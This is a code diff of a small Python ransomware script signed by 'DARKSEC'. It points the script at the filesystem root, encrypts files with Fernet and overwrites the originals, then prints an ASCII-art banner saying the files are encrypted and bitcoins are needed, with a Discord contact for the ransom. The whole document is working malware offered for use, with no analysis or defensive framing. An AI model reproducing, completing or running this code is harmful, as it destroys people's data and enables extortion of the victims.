@@ -1,9 +1,17 @@
 #!/usr/bin/env python3
-
+#DEVELOPER DARKSEC
+#=======================================
 import os
 from cryptography.fernet import Fernet
-#encontrar os arquivos
+#======================================
 
+#DIRETORIO ALVO:
+
+diretorio_alvo = "/"
+
+os.chdir(diretorio_alvo)
+
+# ENCRIPTANDO DADOS
 files = []
 
 for file in os.listdir():
@@ -24,5 +32,14 @@ for file in files:
 	with open(file, "wb") as thefile:
 		thefile.write(content_encrypted)
 
-
-print ("SEUS ARQUIVOS FORAM ENCRIPTADOS!!! DÊ A BUNDA OU ADEUS AO SEUS ARQUIVOS AHHAHAHAHAAHAH!")
+print (" __   __ __  _  _ ___   ___ _ _   ___   ___ __  _  ________   _____ _____ ___ __   ")
+print (" \ `v' //__\| || | _ \ | __| | | | __| | __|  \| |/ _/ _ \ `v' / _,\_   _| __| _\  ")
+print ("  `. .'| \/ | \/ | v / | _|| | |_| _|  | _|| | ' | \_| v /`. .'| v_/ | | | _|| v | ")
+print ("   !_!  \__/ \__/|_|_\ |_| |_|___|___| |___|_|\__|\__/_|_\ !_! |_|   |_| |___|__/  ")
+print ("                                                                                   ")
+print ("    | | |  \| | __| __| _\  |  \ |_   _/ _//__\| |  \| |/' _/ ")
+print ("    | | | | ' | _|| _|| v | | -< | | || \_| \/ | | | ' |`._`. ")
+print ("    |_| |_|\__|___|___|__/  |__/_| |_| \__/\__/|_|_|\__||___/ ")
+print ("                 									")
+print ("											")
+print (" 			| MY DISCORD : darksec_ |")
